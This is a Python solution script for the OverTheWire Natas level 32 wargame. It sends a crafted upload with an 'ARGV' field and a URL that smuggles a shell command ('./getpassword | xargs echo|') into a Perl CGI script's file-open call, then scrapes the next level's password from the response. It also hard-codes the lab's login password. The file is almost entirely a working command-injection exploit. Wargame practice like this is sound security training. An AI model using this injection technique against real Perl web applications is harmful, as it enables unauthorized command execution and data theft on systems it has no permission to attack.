#! /usr/bin/python3
import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup

url = "http://natas32.natas.labs.overthewire.org/index.pl?./getpassword | xargs echo|"
auth = HTTPBasicAuth("natas32","no1vohsheCaiv3ieH4em1ahchisainge")
#for testing
#proxy = {"http":"http://127.0.0.1:8080"}

files = [("file",("abc.csv",b"year,month"))]
data = {"file":"ARGV","submit":"Upload"}

response = requests.post(url,auth=auth,files=files,data=data)
soup = BeautifulSoup(response.text,"html.parser")
print(str(soup.find("th")).replace("<th>","").replace("</th>",""))
